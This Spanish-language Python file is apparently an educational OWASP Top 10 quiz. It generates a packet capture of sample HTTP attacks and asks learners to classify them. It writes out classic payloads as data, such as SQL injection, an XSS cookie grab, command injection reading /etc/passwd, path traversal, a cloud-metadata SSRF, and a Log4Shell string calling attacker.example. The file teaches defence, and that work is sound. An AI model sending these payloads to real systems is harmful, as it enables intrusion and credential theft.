#!/usr/bin/env python3
"""
OWASP TOP 10 - Práctica de seguridad en aplicaciones web
========================================================
A diferencia del resto del juego, que trabaja la seguridad de RED (capas 2 a 4),
este módulo trabaja la seguridad de APLICACIÓN: las diez categorías del OWASP
Top 10 (edición 2021), que es el estándar con el que se clasifican las
vulnerabilidades web.

Tres modos, cada uno ataca el tema desde un ángulo distinto:

  1. ANÁLISIS DE CAPTURA  Lee una captura .pcap con peticiones HTTP reales que
     llevan un ataque dentro. Se ve el volcado y la petición reconstruida, y hay
     que decir a qué categoría del Top 10 corresponde lo que viaja en la URL o
     en las cabeceras. Es el puente con el resto del juego: el ataque se LEE en
     el tráfico, igual que un ARP spoofing o un SYN flood.

  2. DEFINICIONES  Conceptos puros: qué es cada categoría, en los dos sentidos
     (de la descripción al nombre, y del nombre a la descripción).

  3. CASOS  Un relato de una brecha de seguridad (inventado, pero del estilo de
     los que salen en las noticias) y hay que elegir qué categoría del Top 10
     explica lo que pasó.

Uso:
    python3 owasp.py              menú interactivo
    python3 owasp.py --pcap       genera/actualiza la captura de ataques y sale
    python3 owasp.py --lista      imprime el Top 10 y sale

La captura se escribe en la carpeta 'files' junto al resto, para que también se
pueda abrir en Wireshark.
"""

import random
import struct
import sys
from pathlib import Path
from typing import List, Optional, Tuple

RULE = "=" * 74
THIN = "-" * 74
FILES_DIR = Path(__file__).resolve().parent / "files"
PCAP_ATAQUES = FILES_DIR / "owasp_http_attacks.pcap"


# ---------------------------------------------------------------------------
# El OWASP Top 10 (edición 2021): nombre y definición de cada categoría
# ---------------------------------------------------------------------------

TOP10 = {
    "A01": ("Broken Access Control (Control de acceso roto)",
            "El servidor no comprueba bien QUÉ puede hacer o ver cada usuario. "
            "Alguien autenticado (o ni eso) llega a datos o acciones que no le "
            "tocan: ver la factura de otro cambiando un id en la URL (IDOR), "
            "entrar a /admin sin ser admin, o escaparse de la carpeta permitida "
            "con ../../ (path traversal)."),
    "A02": ("Cryptographic Failures (Fallos criptográficos)",
            "Datos sensibles que viajan o se guardan sin la protección debida: "
            "contraseñas o tarjetas por HTTP sin TLS, cifrado débil o roto "
            "(MD5, DES), claves quemadas en el código, contraseñas guardadas en "
            "claro o con un hash sin sal. Antes se llamaba «Exposición de datos "
            "sensibles»."),
    "A03": ("Injection (Inyección)",
            "Entrada del usuario que el programa mete sin filtrar dentro de otra "
            "cosa que luego se interpreta: una consulta SQL (SQL injection), un "
            "comando del sistema (command injection), HTML/JavaScript que acaba "
            "en el navegador de otra víctima (XSS), LDAP, etc. El atacante "
            "escribe datos que el sistema confunde con instrucciones."),
    "A04": ("Insecure Design (Diseño inseguro)",
            "El fallo no está en un bug concreto sino en cómo se pensó la "
            "funcionalidad: falta un límite de intentos, el «recuperar "
            "contraseña» se puede abusar, se confía en que el cliente valide, no "
            "hubo modelado de amenazas. Aunque esté bien programado, el diseño "
            "en sí permite el abuso."),
    "A05": ("Security Misconfiguration (Configuración insegura)",
            "El software está bien, pero mal configurado: cuentas o contraseñas "
            "por defecto, mensajes de error que enseñan la traza y las rutas "
            "internas, paneles de administración abiertos, listado de "
            "directorios activado, cabeceras de seguridad ausentes, servicios "
            "innecesarios encendidos."),
    "A06": ("Vulnerable and Outdated Components (Componentes vulnerables y "
            "desactualizados)",
            "Se usa una librería, framework o servidor con una vulnerabilidad "
            "pública conocida (tiene su CVE) y no se ha parcheado. El atacante "
            "no inventa nada: aprovecha un agujero ya documentado. Log4Shell y "
            "la brecha de Equifax (Apache Struts) son los ejemplos de manual."),
    "A07": ("Identification and Authentication Failures (Fallos de "
            "identificación y autenticación)",
            "El mecanismo que comprueba QUIÉN eres falla: se permiten "
            "contraseñas débiles o filtradas, no hay freno a la fuerza bruta "
            "(credential stuffing), las sesiones no caducan o el id de sesión es "
            "predecible, no hay segundo factor. Antes se llamaba «Broken "
            "Authentication»."),
    "A08": ("Software and Data Integrity Failures (Fallos de integridad de "
            "software y datos)",
            "Se confía en código o datos cuya procedencia no se verifica: una "
            "actualización automática sin firmar, una dependencia del repositorio "
            "que fue manipulada (ataque a la cadena de suministro, estilo "
            "SolarWinds), o deserializar objetos que llegan del usuario sin "
            "comprobarlos."),
    "A09": ("Security Logging and Monitoring Failures (Fallos de registro y "
            "monitorización)",
            "No se registra lo que importa, o nadie mira los registros, así que "
            "un ataque pasa inadvertido durante semanas o meses. Sin logs de "
            "inicios de sesión fallidos ni alertas, la brecha se descubre tarde "
            "y es imposible reconstruir qué pasó."),
    "A10": ("Server-Side Request Forgery - SSRF (Falsificación de petición del "
            "lado del servidor)",
            "Se engaña al servidor para que ÉL haga una petición a una URL que "
            "elige el atacante. Como la petición sale desde dentro, llega a "
            "sitios que el atacante no alcanza: servicios internos o el endpoint "
            "de metadatos de la nube (169.254.169.254), de donde se roban "
            "credenciales temporales."),
}

ORDEN = list(TOP10)


def nombre_corto(cid: str) -> str:
    """'A03' -> 'A03 Injection (Inyección)' pero sin la coletilla larga."""
    return f"{cid} {TOP10[cid][0]}"


# ---------------------------------------------------------------------------
# MODO 1: la captura de ataques HTTP
# ---------------------------------------------------------------------------
# Cada ataque es UNA petición HTTP que viaja en claro. El texto va en la URL o
# en una cabecera, así que se lee directamente en la columna ASCII del volcado.
# El orden de esta lista ES el orden de los paquetes en el .pcap: así, al
# leerlo de vuelta, el paquete i corresponde al ataque i sin ambigüedad.

ATAQUES_HTTP = [
    dict(cid="A03",
         req=("GET /producto.php?id=1' OR '1'='1 HTTP/1.1\r\n"
              "Host: tienda.example\r\n"
              "User-Agent: Mozilla/5.0\r\n"
              "Accept: text/html\r\n\r\n"),
         pista="Mira el valor del parámetro id en la URL.",
         expl="La comilla cierra la cadena de la consulta SQL y «OR '1'='1» la "
              "deja siempre verdadera. Es una SQL injection de manual: entrada "
              "del usuario que el servidor concatena dentro de una consulta sin "
              "separar datos de instrucciones."),
    dict(cid="A03",
         req=("GET /buscar?q=<script>alert(document.cookie)</script> HTTP/1.1\r\n"
              "Host: foro.example\r\n"
              "User-Agent: Mozilla/5.0\r\n\r\n"),
         pista="El parámetro q no es texto a buscar; es HTML.",
         expl="Si la web devuelve ese q dentro de la página sin escaparlo, el "
              "<script> se ejecuta en el navegador de quien abra el enlace. Es "
              "Cross-Site Scripting (XSS), una forma de inyección: el atacante "
              "inyecta JavaScript en el HTML de la víctima."),
    dict(cid="A03",
         req=("GET /herramientas/ping?host=8.8.8.8;cat+/etc/passwd HTTP/1.1\r\n"
              "Host: panel.example\r\n"
              "User-Agent: curl/8.4.0\r\n\r\n"),
         pista="¿Qué hace el «;» después de la IP?",
         expl="El parámetro host se pasa a un comando del sistema (ping). El «;» "
              "termina el ping y encadena un segundo comando, cat /etc/passwd. "
              "Es command injection (OS command injection), también de la "
              "familia de inyección."),
    dict(cid="A01",
         req=("GET /descargas?archivo=../../../../etc/passwd HTTP/1.1\r\n"
              "Host: cdn.example\r\n"
              "User-Agent: Mozilla/5.0\r\n\r\n"),
         pista="Cuenta los «../» del nombre de archivo.",
         expl="Los «../» suben de directorio hasta la raíz y salen de la carpeta "
              "de descargas permitida para leer /etc/passwd. Es path traversal, "
              "un caso de Broken Access Control: se accede a un recurso fuera de "
              "lo autorizado."),
    dict(cid="A01",
         req=("GET /api/facturas/1002 HTTP/1.1\r\n"
              "Host: banca.example\r\n"
              "Cookie: session=usuario1001-a9f3e1\r\n"
              "User-Agent: Mozilla/5.0\r\n\r\n"),
         pista="Compara el id de la URL con el usuario de la cookie.",
         expl="La sesión es del usuario 1001 pero pide la factura 1002, de otro "
              "cliente. Si el servidor la entrega sin comprobar de quién es, es "
              "un IDOR (Insecure Direct Object Reference): Broken Access Control "
              "clásico, cambiar un número en la URL para ver datos ajenos."),
    dict(cid="A10",
         req=("POST /api/preview HTTP/1.1\r\n"
              "Host: app.example\r\n"
              "Content-Type: application/json\r\n"
              "Content-Length: 58\r\n\r\n"
              '{"url":"http://169.254.169.254/latest/meta-data/iam/"}'),
         pista="¿A qué dirección le pides al servidor que vaya?",
         expl="169.254.169.254 es el endpoint de metadatos de las nubes (AWS, "
              "GCP, Azure), solo alcanzable DESDE la propia instancia. Se engaña "
              "al servidor para que lo consulte y devuelva las credenciales "
              "temporales del rol. Es SSRF (Server-Side Request Forgery)."),
    dict(cid="A06",
         req=("GET / HTTP/1.1\r\n"
              "Host: web.example\r\n"
              "User-Agent: ${jndi:ldap://attacker.example/exploit}\r\n"
              "Accept: */*\r\n\r\n"),
         pista="El User-Agent no es un navegador; es una expresión.",
         expl="Esa cadena ${jndi:ldap://...} dispara Log4Shell (CVE-2021-44228), "
              "el fallo de la librería de logs Log4j: al registrar la cabecera, "
              "la librería resuelve el JNDI y ejecuta código remoto. Aprovechar "
              "una vulnerabilidad conocida de una librería sin parchear es "
              "Vulnerable and Outdated Components."),
    dict(cid="A05",
         req=("GET /.env HTTP/1.1\r\n"
              "Host: startup.example\r\n"
              "User-Agent: python-requests/2.31\r\n\r\n"),
         pista="¿Qué archivo se está pidiendo, y debería ser accesible?",
         expl="El .env guarda claves de API y contraseñas de base de datos y "
              "jamás debería servirse por web. Que esté accesible es una "
              "Security Misconfiguration: un archivo sensible expuesto por una "
              "configuración descuidada del servidor."),
    dict(cid="A07",
         req=("POST /login HTTP/1.1\r\n"
              "Host: correo.example\r\n"
              "Content-Type: application/x-www-form-urlencoded\r\n"
              "Content-Length: 29\r\n\r\n"
              "user=admin&pass=123456"),
         pista="Esta es la petición número 480 contra /login en un minuto.",
         expl="Un POST aislado parece normal, pero es uno de cientos contra "
              "/login probando usuario admin con contraseñas comunes. Sin freno "
              "a los intentos, es fuerza bruta / credential stuffing: "
              "Identification and Authentication Failures."),
    dict(cid="A02",
         req=("POST /login HTTP/1.1\r\n"
              "Host: hospital.example\r\n"
              "Content-Type: application/x-www-form-urlencoded\r\n"
              "Content-Length: 37\r\n\r\n"
              "usuario=ana.lopez&clave=Verano2024!"),
         pista="¿Por qué protocolo viaja esta contraseña?",
         expl="La contraseña Verano2024! viaja en claro por HTTP (puerto 80, sin "
              "TLS): cualquiera que capture el tráfico la lee tal cual, como se "
              "ve en este volcado. Datos sensibles sin cifrar en tránsito son "
              "Cryptographic Failures."),
]


# --- construcción del .pcap a mano, sin dependencias (igual que el lector) ---

def _checksum16(data: bytes) -> int:
    """Suma de verificación de Internet: complemento a uno de 16 bits."""
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) | data[i + 1]
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def _frame_http(payload: bytes, sport: int, seq: int,
                src_ip="10.0.0.33", dst_ip="10.0.0.80") -> bytes:
    """Una trama Ethernet + IPv4 + TCP (PSH,ACK) que transporta la petición."""
    eth = (b"\x52\x54\x00\x80\x00\x80"          # MAC destino (servidor)
           b"\x52\x54\x00\x33\x00\x33"          # MAC origen (cliente)
           b"\x08\x00")                         # EtherType IPv4

    src = bytes(int(x) for x in src_ip.split("."))
    dst = bytes(int(x) for x in dst_ip.split("."))

    tcp_sin_cks = struct.pack("!HHIIHHHH",
                              sport, 80, seq, 1,
                              (5 << 12) | 0x018,   # data offset 5, flags PSH+ACK
                              0x1000, 0, 0)
    tcp_sin_cks = tcp_sin_cks[:16] + b"\x00\x00" + tcp_sin_cks[18:]
    pseudo = src + dst + struct.pack("!BBH", 0, 6, len(tcp_sin_cks) + len(payload))
    tcp_cks = _checksum16(pseudo + tcp_sin_cks + payload)
    tcp = tcp_sin_cks[:16] + struct.pack("!H", tcp_cks) + tcp_sin_cks[18:]

    total_len = 20 + len(tcp) + len(payload)
    ip_sin_cks = struct.pack("!BBHHHBBH", 0x45, 0, total_len,
                             0x1234, 0x4000, 64, 6, 0) + src + dst
    ip_cks = _checksum16(ip_sin_cks)
    ip = ip_sin_cks[:10] + struct.pack("!H", ip_cks) + ip_sin_cks[12:]

    return eth + ip + tcp + payload


def generar_pcap(path: Path = PCAP_ATAQUES) -> Path:
    """Escribe la captura de ataques HTTP a partir de ATAQUES_HTTP."""
    path.parent.mkdir(parents=True, exist_ok=True)
    cabecera = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
    registros = []
    for i, atq in enumerate(ATAQUES_HTTP):
        frame = _frame_http(atq["req"].encode("latin-1"),
                            sport=40000 + i, seq=1000 * (i + 1))
        reg = struct.pack("<IIII", 1_700_000_000 + i, i * 1000,
                          len(frame), len(frame))
        registros.append(reg + frame)
    path.write_bytes(cabecera + b"".join(registros))
    return path


# ---------------------------------------------------------------------------
# MODO 3: casos (relatos de brechas inventados; elige la categoría)
# ---------------------------------------------------------------------------

CASOS = [
    ("A01",
     "En la app de una aseguradora, un cliente ve su póliza en "
     "/poliza?num=58120. Por curiosidad cambia el número a 58121 y aparece la "
     "póliza de otra persona, con su nombre y su domicilio. Prueba más números "
     "y puede leer miles de pólizas ajenas.",
     "No hay fallo de login ni de cifrado: el usuario está bien autenticado. "
     "Lo que falta es comprobar que la póliza que pide sea SUYA. Cambiar un id "
     "para ver datos de otro es un IDOR, el ejemplo típico de Broken Access "
     "Control."),
    ("A01",
     "Un empleado descubre que, aunque el menú de su perfil no muestra la "
     "opción, escribir directamente la URL /admin/usuarios en el navegador le "
     "deja entrar al panel de administración y dar de baja cuentas.",
     "Ocultar el enlace en el menú no es control de acceso. El servidor debe "
     "rechazar a quien no sea admin aunque teclee la URL. Acceder a una función "
     "para la que no se tiene permiso es Broken Access Control."),
    ("A02",
     "Tras robar la base de datos de una tienda, los atacantes publican las "
     "contraseñas de todos los clientes. Resultó que estaban guardadas tal cual "
     "escritas, sin ningún tipo de hash ni cifrado.",
     "El problema es cómo se protegían (o no) los datos sensibles. Guardar "
     "contraseñas en texto plano es un Cryptographic Failure."),
    ("A02",
     "En una cafetería, alguien con el portátil captura el wifi y ve pasar el "
     "usuario y la contraseña de quienes entran al portal de empleados de una "
     "cadena, porque el formulario envía los datos por http:// y no https://.",
     "Las credenciales viajan sin cifrar y se pueden leer del tráfico. Datos "
     "sensibles sin TLS en tránsito son un Cryptographic Failure."),
    ("A03",
     "Un buscador de una web muestra «No hay resultados para: TEXTO», donde "
     "TEXTO es lo que escribió el usuario. Alguien busca un fragmento de "
     "JavaScript y comprueba que el navegador lo ejecuta. Reparte un enlace "
     "preparado y roba las sesiones de quienes lo abren.",
     "La entrada del usuario acaba ejecutándose como código en el navegador de "
     "las víctimas: es XSS, dentro de la categoría Injection."),
    ("A03",
     "En un formulario de acceso, escribir en el campo usuario el texto "
     "admin'-- permite entrar sin contraseña, porque el texto altera la "
     "consulta que valida las credenciales contra la base de datos.",
     "La entrada se mezcla con la consulta SQL y cambia su lógica. Es SQL "
     "injection, de la categoría Injection."),
    ("A04",
     "Una web permite pedir cita médica. No hay ningún límite: un script puede "
     "reservar las 500 citas del día en segundos y dejar la agenda inservible. "
     "El código funciona perfecto; simplemente nunca se pensó en abusos así.",
     "No es un bug de implementación ni una mala config: la funcionalidad se "
     "diseñó sin defensas contra el abuso (faltan límites, no hubo modelado de "
     "amenazas). Eso es Insecure Design."),
    ("A04",
     "El «¿olvidó su contraseña?» de un banco pide solo la fecha de nacimiento "
     "para dejar cambiarla. Como ese dato es fácil de averiguar, cualquiera "
     "puede tomar la cuenta de otro. El flujo hace justo lo que se diseñó.",
     "El mecanismo de recuperación es inseguro por diseño: el propio flujo, "
     "aun bien programado, permite el secuestro. Es Insecure Design."),
    ("A05",
     "Al provocar un error en una web, en vez de una página amable aparece la "
     "traza completa de la excepción: rutas del servidor, versión del framework "
     "y hasta la cadena de conexión a la base de datos.",
     "El software no está roto, está mal configurado: dejar los errores "
     "detallados en producción filtra información interna. Es Security "
     "Misconfiguration."),
    ("A05",
     "Un equipo despliega un panel de base de datos y lo deja con el usuario y "
     "la contraseña que trae de fábrica (admin/admin), accesible desde "
     "Internet. Alguien entra sin esfuerzo con esas credenciales por defecto.",
     "Credenciales por defecto sin cambiar y un servicio expuesto que no "
     "debería estarlo: Security Misconfiguration."),
    ("A06",
     "Una empresa sufre una intrusión total. La causa: usaban una versión "
     "antigua de un framework con una vulnerabilidad pública (tenía su CVE y su "
     "parche desde hacía meses) que nunca actualizaron. (Es el patrón de la "
     "brecha de Equifax con Apache Struts.)",
     "El agujero ya estaba documentado y parcheado; el fallo fue no actualizar. "
     "Es Vulnerable and Outdated Components."),
    ("A06",
     "En diciembre de 2021 medio Internet corre a parchear por una cadena "
     "${jndi:ldap://...} que, al ser registrada por la librería de logs Log4j, "
     "ejecuta código remoto. Las apps afectadas solo tenían esa dependencia "
     "sin actualizar.",
     "Log4Shell: una librería ampliamente usada con un fallo crítico conocido. "
     "Sufrirlo por no haberla actualizado es Vulnerable and Outdated "
     "Components."),
    ("A07",
     "Un servicio de streaming nota accesos raros: los atacantes probaron, "
     "contra su login, millones de pares usuario/contraseña filtrados de OTRA "
     "web. Como mucha gente reutiliza claves y no había segundo factor ni "
     "límite de intentos, entraron en miles de cuentas.",
     "Fallan los controles de autenticación: sin freno a los intentos ni 2FA, "
     "el credential stuffing funciona. Es Identification and Authentication "
     "Failures."),
    ("A07",
     "Una web genera los identificadores de sesión de forma predecible "
     "(sesión1001, sesión1002...). Un atacante prueba números cercanos al suyo "
     "en la cookie y se cuela en la sesión ya iniciada de otros usuarios.",
     "El manejo de la sesión es débil: un id de sesión adivinable deja "
     "suplantar a otros. Es Identification and Authentication Failures."),
    ("A08",
     "Una herramienta de monitorización muy usada recibe una actualización "
     "automática firmada con la infraestructura del fabricante... que los "
     "atacantes habían comprometido. Miles de clientes instalan la puerta "
     "trasera creyendo que es una actualización legítima. (Estilo SolarWinds.)",
     "Se confió en una actualización cuya integridad estaba comprometida en "
     "origen: un ataque a la cadena de suministro. Es Software and Data "
     "Integrity Failures."),
    ("A08",
     "Una app guarda el estado del carrito como un objeto serializado en una "
     "cookie y lo vuelve a cargar tal cual al volver el usuario. Un atacante "
     "modifica ese objeto a mano y, al deserializarlo el servidor sin "
     "comprobar nada, consigue ejecutar código.",
     "Se deserializan datos que vienen del usuario sin verificar su integridad. "
     "Es Software and Data Integrity Failures."),
    ("A09",
     "Una empresa se entera por un periodista de que lleva ocho meses con los "
     "atacantes dentro robando datos. No tenían alertas ni revisaban los "
     "registros de acceso; de hecho, de varios sistemas ni siquiera guardaban "
     "logs, así que no pueden reconstruir qué se llevaron.",
     "El ataque pasó inadvertido por falta de registro y vigilancia. Es "
     "Security Logging and Monitoring Failures."),
    ("A09",
     "El equipo de seguridad investiga un incidente, pero los inicios de sesión "
     "fallidos no se guardaban en ningún sitio y los pocos logs que había se "
     "sobrescribían cada día. Imposible saber cuándo ni cómo empezó todo.",
     "Sin logs útiles ni retención, detectar y analizar la brecha es "
     "imposible. Es Security Logging and Monitoring Failures."),
    ("A10",
     "Una web deja subir una foto de perfil «desde una URL». Un atacante, en "
     "vez de una imagen, pone http://169.254.169.254/latest/meta-data/ y el "
     "servidor, alojado en la nube, le devuelve las credenciales temporales de "
     "su propio rol.",
     "Se abusa del servidor para que haga una petición a un destino interno que "
     "el atacante no alcanza directamente. Es SSRF (Server-Side Request "
     "Forgery)."),
    ("A10",
     "Un conversor de páginas a PDF acepta cualquier URL. Alguien le pasa "
     "http://localhost:8080/admin, una consola interna que solo responde a "
     "peticiones del propio servidor, y obtiene su contenido en el PDF.",
     "El servidor hace de puente hacia un servicio interno no expuesto: es "
     "SSRF."),
]


# ---------------------------------------------------------------------------
# Motor de preguntas (mínimo, autónomo)
# ---------------------------------------------------------------------------

def _normaliza(t: str) -> str:
    return " ".join(str(t).strip().lower().split())


def _opciones(correcto: str, n: int = 4) -> Tuple[List[str], int]:
    """n categorías: la correcta y n-1 distractoras, barajadas."""
    otras = [c for c in ORDEN if c != correcto]
    random.shuffle(otras)
    elegidas = [correcto] + otras[:n - 1]
    random.shuffle(elegidas)
    return elegidas, elegidas.index(correcto)


def _preguntar_mcq(enunciado: str, opciones_cid: List[str], idx_ok: int,
                   explica: str, etiqueta: str, dump: str = "") -> bool:
    print("\n" + THIN)
    print(f"[{etiqueta}]")
    if dump:
        print(dump)
    print(enunciado)
    letras = "ABCDEFGHIJ"
    for i, cid in enumerate(opciones_cid):
        print(f"  {letras[i]}) {nombre_corto(cid)}")
    bruto = input("Tu respuesta (letra): ").strip().upper()
    ok = bruto in letras[:len(opciones_cid)] and letras.index(bruto) == idx_ok
    correcta = f"{letras[idx_ok]}) {nombre_corto(opciones_cid[idx_ok])}"
    print(">> Correcto." if ok else f">> Incorrecto. Respuesta correcta: {correcta}")
    print(f"   {explica}")
    return ok


def _volcado_http(num_pregunta: int, atq: dict) -> Tuple[str, str]:
    """Devuelve (volcado o aviso, texto de la petición). Usa el lector del juego."""
    req = atq["req"]
    transcripcion = "\n".join("    " + l for l in req.replace("\r\n", "\n").split("\n"))
    bloque_req = "\n".join([RULE, "  Petición HTTP reconstruida del flujo TCP",
                            THIN, transcripcion.rstrip(), RULE])
    try:
        import hex_dump_quiz as hq
        pkts = hq.cargar_captura(PCAP_ATAQUES)
        http = [p for p in pkts if p.payload[:8].lstrip().startswith(
            (b"GET", b"POST", b"PUT", b"HEAD", b"DELETE", b"HTTP"))]
        if num_pregunta < len(http):
            p = http[num_pregunta]
            volcado = "\n".join([RULE,
                                 f"  Paquete #{p.num}  ({len(p.raw)} bytes  |  "
                                 f"{' / '.join(p.layers)})", RULE,
                                 hq.hex_dump(p.raw, with_ascii=True), RULE])
            return volcado + "\n" + bloque_req, req
    except Exception:
        pass
    # si por lo que sea no se puede leer el pcap, al menos se ve la petición
    return bloque_req, req


def ronda_pcap(n: int = 8) -> Tuple[int, int]:
    """Modo 1: lee la captura y pregunta la categoría de cada ataque."""
    if not PCAP_ATAQUES.exists():
        print(f"\nGenerando la captura de ataques en {PCAP_ATAQUES.name}...")
        generar_pcap()

    indices = list(range(len(ATAQUES_HTTP)))
    random.shuffle(indices)
    indices = indices[:n]
    aciertos = 0
    for k, i in enumerate(indices, 1):
        atq = ATAQUES_HTTP[i]
        dump, _ = _volcado_http(i, atq)
        opciones, idx_ok = _opciones(atq["cid"])
        print(f"\nPregunta {k}/{len(indices)}")
        ok = _preguntar_mcq(
            "¿A qué categoría del OWASP Top 10 corresponde el ataque que viaja "
            f"en esta petición?\n  Pista: {atq['pista']}",
            opciones, idx_ok, atq["expl"], "CAPTURA | HTTP", dump=dump)
        aciertos += ok
    return aciertos, len(indices)


def ronda_definiciones(n: int = 8) -> Tuple[int, int]:
    """Modo 2: en los dos sentidos, descripción<->nombre."""
    ids = ORDEN[:]
    random.shuffle(ids)
    ids = (ids * ((n // len(ids)) + 1))[:n]
    aciertos = 0
    for k, cid in enumerate(ids, 1):
        nombre, definicion = TOP10[cid]
        print(f"\nPregunta {k}/{n}")
        if random.random() < 0.5:
            # descripción -> nombre
            opciones, idx_ok = _opciones(cid)
            ok = _preguntar_mcq(f"¿Qué categoría describe esto?\n\n  {definicion}",
                                opciones, idx_ok,
                                f"Es {nombre_corto(cid)}.", "DEFINICIÓN")
        else:
            # nombre -> descripción (las opciones son descripciones)
            otras = [c for c in ORDEN if c != cid]
            random.shuffle(otras)
            elegidas = [cid] + otras[:3]
            random.shuffle(elegidas)
            idx_ok = elegidas.index(cid)
            print("\n" + THIN)
            print("[DEFINICIÓN]")
            print(f"¿Cuál describe «{cid} {nombre}»?")
            letras = "ABCD"
            for i, c in enumerate(elegidas):
                desc = TOP10[c][1]
                desc = (desc[:160] + "…") if len(desc) > 161 else desc
                print(f"  {letras[i]}) {desc}")
            bruto = input("Tu respuesta (letra): ").strip().upper()
            ok = bruto in letras and letras.index(bruto) == idx_ok
            print(">> Correcto." if ok else
                  f">> Incorrecto. Respuesta correcta: {letras[idx_ok]}.")
            print(f"   {cid} es {nombre}.")
        aciertos += ok
    return aciertos, n


def ronda_casos(n: int = 8) -> Tuple[int, int]:
    """Modo 3: un relato de brecha; elige la categoría que lo explica."""
    casos = CASOS[:]
    random.shuffle(casos)
    casos = casos[:n]
    aciertos = 0
    for k, (cid, relato, expl) in enumerate(casos, 1):
        opciones, idx_ok = _opciones(cid)
        print(f"\nPregunta {k}/{len(casos)}")
        caja = "\n".join([RULE, "  CASO", THIN, "  " + relato, RULE])
        ok = _preguntar_mcq("¿Qué categoría del OWASP Top 10 explica esta "
                            "brecha?", opciones, idx_ok, expl, "CASO", dump=caja)
        aciertos += ok
    return aciertos, len(casos)


# ---------------------------------------------------------------------------
# Menús
# ---------------------------------------------------------------------------

def _menu(titulo: str, opciones: List[str]) -> int:
    print(f"\n{titulo}")
    for i, o in enumerate(opciones, 1):
        print(f"  {i}) {o}")
    while True:
        bruto = input("> ").strip()
        if bruto.isdigit() and 1 <= int(bruto) <= len(opciones):
            return int(bruto) - 1
        print(f"Escribe un número entre 1 y {len(opciones)}.")


def _cuantas(maximo: int) -> int:
    bruto = input(f"\n¿Cuántas preguntas? (Enter = 8, máx {maximo}): ").strip()
    if not bruto.isdigit():
        return min(8, maximo)
    return max(1, min(int(bruto), maximo))


def _resultado(aciertos: int, total: int) -> None:
    if not total:
        return
    pct = 100 * aciertos / total
    print(f"\n{RULE}\nResultado: {aciertos}/{total}  ({pct:.0f}%)\n{RULE}")
    if pct >= 90:
        print("Dominas el Top 10.")
    elif pct >= 60:
        print("Bien. Repasa las categorías que confundiste.")
    else:
        print("Empieza por el modo «Definiciones» para fijar las diez categorías.")


def imprimir_top10() -> None:
    print("\n" + RULE)
    print("  OWASP TOP 10 (2021)")
    print(RULE)
    for cid in ORDEN:
        nombre, definicion = TOP10[cid]
        print(f"\n{cid}  {nombre}")
        for linea in _ajustar(definicion, 70):
            print(f"    {linea}")


def _ajustar(texto: str, ancho: int) -> List[str]:
    palabras, linea, salida = texto.split(), "", []
    for p in palabras:
        if len(linea) + len(p) + 1 > ancho:
            salida.append(linea)
            linea = p
        else:
            linea = f"{linea} {p}".strip()
    if linea:
        salida.append(linea)
    return salida


def main() -> None:
    print(RULE)
    print("OWASP TOP 10 - seguridad de aplicaciones web")
    print(RULE)
    print("El resto del juego trabaja la seguridad de RED (ARP, floods, "
          "escaneos).")
    print("Aquí se practica la seguridad de APLICACIÓN: las diez categorías con")
    print("las que el OWASP clasifica las vulnerabilidades web.")

    while True:
        opcion = _menu("¿Qué quieres hacer?",
                       ["Análisis de captura (leer ataques HTTP en un .pcap)",
                        "Definiciones (qué es cada categoría)",
                        "Casos (un relato de brecha; elige la categoría)",
                        "Ver el Top 10 completo",
                        "Volver"])
        if opcion == 0:
            n = _cuantas(len(ATAQUES_HTTP))
            _resultado(*ronda_pcap(n))
        elif opcion == 1:
            n = _cuantas(20)
            _resultado(*ronda_definiciones(n))
        elif opcion == 2:
            n = _cuantas(len(CASOS))
            _resultado(*ronda_casos(n))
        elif opcion == 3:
            imprimir_top10()
        else:
            return


if __name__ == "__main__":
    if "--pcap" in sys.argv:
        ruta = generar_pcap()
        print(f"Captura escrita en {ruta}")
    elif "--lista" in sys.argv:
        imprimir_top10()
    else:
        try:
            main()
        except (KeyboardInterrupt, EOFError):
            print("\n\nHasta la próxima.")
